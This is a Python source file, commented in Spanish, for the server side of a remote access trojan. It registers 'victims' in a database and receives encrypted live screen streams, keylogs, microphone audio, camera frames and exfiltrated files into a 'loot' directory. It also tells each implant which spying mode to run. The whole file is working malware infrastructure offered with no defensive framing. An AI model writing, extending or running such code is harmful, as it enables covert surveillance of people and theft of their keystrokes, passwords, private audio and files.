import socket
import struct
import sys
import os
import json
import threading
import time
from pathlib import Path
from utils.victims_db import VictimsDatabase
from utils.crypto import derive_key, AESCipher, MAGIC, HANDSHAKE_HEADER_SIZE, HANDSHAKE_FMT

class StreamReceiver:
    def __init__(self, port, mode="screen", auto_reconnect=True, encryption_key="crock_default_key_change_me_2024"):
        self.port = port
        self.mode = mode
        self.auto_reconnect = auto_reconnect
        self.db = VictimsDatabase()
        self.running = True
        self.active_connections = {}
        self.data_lock = threading.Lock()
        self.encryption_key = derive_key(encryption_key)
        
        # Crear directorio de loot
        self.loot_dir = os.path.join("data", "loot")
        Path(self.loot_dir).mkdir(parents=True, exist_ok=True)
    
    def _recv_exact(self, conn, n):
        """Recibe exactamente n bytes o lanza excepción"""
        buf = bytearray()
        while len(buf) < n:
            chunk = conn.recv(min(n - len(buf), 65536))
            if not chunk:
                raise ConnectionError("Conexión cerrada")
            buf.extend(chunk)
        return bytes(buf)
    
    def _do_handshake(self, conn, addr):
        """Realiza handshake con el payload — recibe info de la víctima + IV"""
        try:
            # Leer header: magic(4) + iv(16) + info_len(4)
            header = self._recv_exact(conn, HANDSHAKE_HEADER_SIZE)
            magic, iv, info_len = struct.unpack(HANDSHAKE_FMT, header)
            
            if magic != MAGIC:
                print(f"    [-] Magic inválido de {addr[0]}: {magic}")
                return None, None, None
            
            if info_len > 8192:
                print(f"    [-] Info demasiado grande de {addr[0]}: {info_len}")
                return None, None, None
            
            # Leer info JSON (cifrado)
            encrypted_info = self._recv_exact(conn, info_len)
            
            # Descifrar
            cipher = AESCipher(self.encryption_key, iv)
            info_json = cipher.process(encrypted_info)
            
            try:
                info = json.loads(info_json.decode('utf-8'))
            except (json.JSONDecodeError, UnicodeDecodeError):
                print(f"    [-] Info JSON inválido de {addr[0]}")
                return None, None, None
            
            victim_info = {
                'ip': addr[0],
                'hostname': info.get('hostname', 'Unknown'),
                'username': info.get('username', 'Unknown'),
                'os': info.get('os', 'Unknown'),
                'mode': info.get('mode', self.mode),
            }
            
            # Crear cipher para el stream de datos (usa el mismo IV, estado continúa)
            stream_cipher = AESCipher(self.encryption_key, iv)
            # Avanzar el cipher por los bytes ya procesados
            stream_cipher.process(b'\x00' * info_len)
            
            # Responder con el modo de ataque deseado cifrado
            cmd_bytes = self.mode.encode('utf-8')
            enc_cmd = stream_cipher.process(cmd_bytes)
            enc_cmd_len = stream_cipher.process(struct.pack('>I', len(enc_cmd)))
            conn.sendall(enc_cmd_len + enc_cmd)
            
            return victim_info, iv, stream_cipher
            
        except Exception as e:
            print(f"    [-] Error en handshake con {addr[0]}: {e}")
            return None, None, None
    
    def start(self):
        print(f"\n[*] Iniciando receptor en puerto {self.port}")
        print(f"[*] Modo: {self.mode.upper()}")
        print(f"[*] Cifrado: AES-256-CTR")
        print(f"[*] Reconexión automática: {'SI' if self.auto_reconnect else 'NO'}")
        print(f"[*] Directorio loot: {os.path.abspath(self.loot_dir)}")
        print(f"[*] Esperando conexiones... (Ctrl+C para salir)\n")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # TCP keepalive params (Windows)
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
            except (AttributeError, OSError):
                pass
            
            sock.bind(("0.0.0.0", self.port))
            sock.listen(20)
            
            print(f"[+] Escuchando en 0.0.0.0:{self.port}")
            print(f"[+] Total víctimas registradas: {self.db.get_victim_count()}")
            print(f"[+] Víctimas activas: {self.db.get_active_count()}")
            print(f"[+] Archivos exfiltrados: {self.db.get_total_files_count()}\n")
            
            while self.running:
                try:
                    sock.settimeout(1)
                    conn, addr = sock.accept()
                    sock.settimeout(None)
                    
                    conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    conn.settimeout(60)
                    
                    print(f"[+] Conexión recibida de {addr[0]}:{addr[1]}")
                    
                    thread = threading.Thread(
                        target=self._handle_connection,
                        args=(conn, addr),
                        daemon=True
                    )
                    thread.start()
                    
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    print("\n[*] Interrupción del usuario")
                    break
                except Exception as e:
                    print(f"[-] Error: {e}")
            
            self.running = False
            sock.close()
            print(f"\n[+] Receptor detenido")
            print(f"[+] Total víctimas: {self.db.get_victim_count()}")
            print(f"[+] Archivos exfiltrados: {self.db.get_total_files_count()}")
            
        except Exception as e:
            print(f"[-] Error al iniciar receptor: {e}")
    
    def _handle_connection(self, conn, addr):
        """Maneja una conexión entrante con handshake"""
        ip = addr[0]
        victim_id = None
        
        try:
            # Handshake — obtener info víctima + cipher
            victim_info, iv, stream_cipher = self._do_handshake(conn, addr)
            
            if not victim_info:
                print(f"    [-] Handshake fallido con {ip}, cerrando")
                conn.close()
                return
            
            mode = victim_info.get('mode', self.mode)
            
            print(f"    [+] Handshake OK: {victim_info['hostname']} | "
                  f"{victim_info['username']}@{victim_info['os']} | modo={mode}")
            
            # Registrar en base de datos
            victim_id, status = self.db.add_victim(
                ip_address=victim_info['ip'],
                hostname=victim_info['hostname'],
                username=victim_info['username'],
                os_info=victim_info['os'],
                mode=mode
            )
            
            print(f"    [+] Víctima {status}: #{victim_id} {victim_info['hostname']} ({ip})")
            
            with self.data_lock:
                self.active_connections[ip] = {
                    'conn': conn,
                    'victim_id': victim_id,
                    'connected_at': time.time(),
                    'bytes_received': 0,
                    'mode': mode,
                }
            
            # Procesar según modo
            if mode == "screen":
                self._receive_screen(conn, addr, victim_id, stream_cipher)
            elif mode == "keylogger":
                self._receive_keylogger(conn, addr, victim_id, stream_cipher)
            elif mode == "microphone":
                self._receive_microphone(conn, addr, victim_id, stream_cipher)
            elif mode == "camera":
                self._receive_camera(conn, addr, victim_id, stream_cipher)
            elif mode == "files":
                self._receive_files(conn, addr, victim_id, stream_cipher)
            else:
                self._receive_screen(conn, addr, victim_id, stream_cipher)
                
        except Exception as e:
            print(f"[-] Error procesando {addr}: {e}")
        finally:
            try:
                with self.data_lock:
                    if ip in self.active_connections:
                        info = self.active_connections[ip]
                        bytes_rx = info.get('bytes_received', 0)
                        
                        if victim_id and bytes_rx > 0:
                            self.db.update_victim_activity(victim_id, bytes_rx)
                            print(f"[*] Desconectado: {ip} — {self._format_size(bytes_rx)} recibidos")
                        else:
                            print(f"[*] Desconectado: {ip}")
                        
                        if victim_id:
                            self.db.set_victim_inactive(victim_id)
                        
                        del self.active_connections[ip]
                
                conn.close()
            except:
                pass
    
    def _update_bytes(self, ip, count):
        with self.data_lock:
            if ip in self.active_connections:
                self.active_connections[ip]['bytes_received'] += count
    
    def _format_size(self, size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"
    
    def _receive_screen(self, conn, addr, victim_id, cipher):
        """Recibe stream de pantalla cifrado y lo muestra en tiempo real"""
        print(f"[*] Recibiendo pantalla de {addr[0]}...")
        
        try:
            import cv2
            import numpy as np
            has_cv2 = True
            window_name = f"Screen: {addr[0]}"
            cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
        except ImportError:
            has_cv2 = False
            print("[-] OpenCV no instalado. No se puede mostrar la pantalla.")
            print("[*] Ejecuta: pip install opencv-python")
            
        try:
            total_frames = 0
            total_bytes = 0
            
            while self.running:
                try:
                    # Header cifrado: 4 bytes (tamaño de la imagen en jpg)
                    enc_size = self._recv_exact(conn, 4)
                    size_data = cipher.process(enc_size)
                    frame_size = struct.unpack('>I', size_data)[0]
                    
                    if frame_size > 10 * 1024 * 1024:
                        print(f"    [-] Frame demasiado grande: {frame_size}")
                        break
                        
                    enc_frame = self._recv_exact(conn, frame_size)
                    
                    total_frames += 1
                    total_bytes += frame_size + 4
                    self._update_bytes(addr[0], frame_size + 4)
                    
                    if has_cv2:
                        frame_data = cipher.process(enc_frame)
                        try:
                            # Decodificar JPEG
                            np_arr = np.frombuffer(frame_data, np.uint8)
                            img_bgr = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
                            
                            if img_bgr is not None:
                                cv2.imshow(window_name, img_bgr)
                            else:
                                print("[-] Frame descartado por corrupción")
                        except Exception as e:
                            print(f"[-] Error decodificando imagen: {e}")
                        
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            print(f"\n[*] Visualización cerrada manualmente por el atacante.")
                            break
                            
                    else:
                        if total_frames % 100 == 0:
                            print(f"    [*] {addr[0]}: {total_frames} frames | "
                                  f"{self._format_size(total_bytes)}")
                    
                except socket.timeout:
                    print(f"    [-] Timeout de {addr[0]}")
                    break
                except ConnectionError:
                    break
                except Exception as e:
                    print(f"    [-] Error frame: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Error en receive_screen: {e}")
        finally:
            if has_cv2:
                try:
                    cv2.destroyWindow(window_name)
                except:
                    pass

    def _receive_keylogger(self, conn, addr, victim_id, cipher):
        """Recibe eventos de teclado cifrados y los imprime en vivo"""
        print(f"[*] Recibiendo keylog de {addr[0]}...")
        print(f"[*] Mostrando teclas en vivo (se guardan en data/loot)...\n")
        
        # Guardar keylog en archivo
        log_dir = os.path.join(self.loot_dir, addr[0].replace('.', '_'))
        Path(log_dir).mkdir(parents=True, exist_ok=True)
        log_file = os.path.join(log_dir, f"keylog_{int(time.time())}.txt")
        
        try:
            events = 0
            total_bytes = 0
            
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"=== KEYLOG START {addr[0]} {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                
                while self.running:
                    try:
                        enc_data = conn.recv(4096)
                        if not enc_data:
                            break
                        
                        data = cipher.process(enc_data)
                        total_bytes += len(enc_data)
                        events += 1
                        self._update_bytes(addr[0], len(enc_data))
                        
                        # Guardar en archivo
                        text = data.decode('utf-8', errors='replace')
                        f.write(text)
                        f.flush()
                        
                        # Mostrar en consola en vivo
                        if len(text) == 1:
                            print(text, end='', flush=True)
                        elif "ENTER" in text.upper():
                            print(f" {text} ")
                        else:
                            print(f" {text} ", end='', flush=True)
                        
                    except socket.timeout:
                        continue
                    except ConnectionError:
                        break
                    except Exception as e:
                        print(f"\n    [-] Error: {e}")
                        break
                
                f.write(f"\n=== KEYLOG END {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
            
            print(f"\n    [+] Keylog guardado: {log_file}")
                    
        except Exception as e:
            print(f"[-] Error en receive_keylogger: {e}")
    
    def _receive_microphone(self, conn, addr, victim_id, cipher):
        """Recibe chunks de audio cifrados"""
        print(f"[*] Recibiendo audio de {addr[0]}...")
        
        # Guardar audio en archivo
        audio_dir = os.path.join(self.loot_dir, addr[0].replace('.', '_'))
        Path(audio_dir).mkdir(parents=True, exist_ok=True)
        audio_file = os.path.join(audio_dir, f"audio_{int(time.time())}.raw")
        
        try:
            chunks = 0
            total_bytes = 0
            
            with open(audio_file, 'wb') as f:
                while self.running:
                    try:
                        enc_data = conn.recv(65536)
                        if not enc_data:
                            break
                        
                        data = cipher.process(enc_data)
                        f.write(data)
                        
                        chunks += 1
                        total_bytes += len(enc_data)
                        self._update_bytes(addr[0], len(enc_data))
                        
                        if chunks % 50 == 0:
                            print(f"    [*] {addr[0]}: {chunks} chunks | {self._format_size(total_bytes)}")
                        
                    except socket.timeout:
                        continue
                    except ConnectionError:
                        break
                    except Exception as e:
                        print(f"    [-] Error: {e}")
                        break
            
            print(f"    [+] Audio guardado: {audio_file}")
                    
        except Exception as e:
            print(f"[-] Error en receive_microphone: {e}")
    
    def _receive_camera(self, conn, addr, victim_id, cipher):
        """Recibe frames de cámara cifrados"""
        print(f"[*] Recibiendo cámara de {addr[0]}...")
        try:
            frames = 0
            total_bytes = 0
            
            while self.running:
                try:
                    # Leer tamaño cifrado (4 bytes)
                    enc_size = self._recv_exact(conn, 4)
                    size_data = cipher.process(enc_size)
                    frame_size = struct.unpack('>I', size_data)[0]
                    
                    if frame_size > 10 * 1024 * 1024:  # Sanity check 10MB max
                        print(f"    [-] Frame demasiado grande: {frame_size}")
                        break
                    
                    # Leer frame cifrado
                    enc_frame = self._recv_exact(conn, frame_size)
                    
                    frames += 1
                    total_bytes += frame_size + 4
                    self._update_bytes(addr[0], frame_size + 4)
                    
                    if frames % 30 == 0:
                        print(f"    [*] {addr[0]}: {frames} frames | {self._format_size(total_bytes)}")
                    
                except socket.timeout:
                    continue
                except ConnectionError:
                    break
                except Exception as e:
                    print(f"    [-] Error: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Error en receive_camera: {e}")
    
    def _receive_files(self, conn, addr, victim_id, cipher):
        """Recibe archivos exfiltrados cifrados"""
        print(f"[*] Recibiendo archivos de {addr[0]}...")
        
        victim_loot_dir = os.path.join(self.loot_dir, addr[0].replace('.', '_'), "files")
        Path(victim_loot_dir).mkdir(parents=True, exist_ok=True)
        
        try:
            files_received = 0
            total_bytes = 0
            
            while self.running:
                try:
                    # Protocolo: [4B name_len][name][8B file_size][file_data]
                    # Todo cifrado
                    
                    # Leer name_len (4 bytes)
                    enc_namelen = self._recv_exact(conn, 4)
                    name_len_data = cipher.process(enc_namelen)
                    name_len = struct.unpack('>I', name_len_data)[0]
                    
                    if name_len == 0:
                        # Señal de fin
                        print(f"    [+] Fin de transmisión de archivos de {addr[0]}")
                        break
                    
                    if name_len > 4096:
                        print(f"    [-] Nombre demasiado largo: {name_len}")
                        break
                    
                    # Leer nombre
                    enc_name = self._recv_exact(conn, name_len)
                    filename = cipher.process(enc_name).decode('utf-8', errors='replace')
                    
                    # Leer file_size (8 bytes)
                    enc_size = self._recv_exact(conn, 8)
                    file_size = struct.unpack('>Q', cipher.process(enc_size))[0]
                    
                    # Sanitizar nombre de archivo
                    safe_name = filename.replace('\\', '/').split('/')[-1]
                    safe_name = "".join(c for c in safe_name if c.isalnum() or c in '._- ')
                    if not safe_name:
                        safe_name = f"file_{files_received}"
                    
                    # Evitar sobreescribir
                    local_path = os.path.join(victim_loot_dir, safe_name)
                    base, ext = os.path.splitext(local_path)
                    counter = 1
                    while os.path.exists(local_path):
                        local_path = f"{base}_{counter}{ext}"
                        counter += 1
                    
                    print(f"    [*] Recibiendo: {filename} ({self._format_size(file_size)})")
                    
                    # Recibir y guardar archivo
                    received = 0
                    with open(local_path, 'wb') as f:
                        while received < file_size:
                            chunk_size = min(65536, file_size - received)
                            enc_chunk = self._recv_exact(conn, chunk_size)
                            data = cipher.process(enc_chunk)
                            f.write(data)
                            received += chunk_size
                    
                    files_received += 1
                    total_bytes += file_size
                    self._update_bytes(addr[0], file_size + name_len + 12)
                    
                    # Registrar en DB
                    self.db.add_file_log(victim_id, safe_name, filename, file_size, local_path)
                    
                    print(f"    [+] Guardado: {local_path}")
                    
                except ConnectionError:
                    break
                except socket.timeout:
                    print(f"    [-] Timeout esperando archivo")
                    break
                except Exception as e:
                    print(f"    [-] Error recibiendo archivo: {e}")
                    break
            
            print(f"\n    [+] Total archivos: {files_received} | {self._format_size(total_bytes)}")
                    
        except Exception as e:
            print(f"[-] Error en receive_files: {e}")
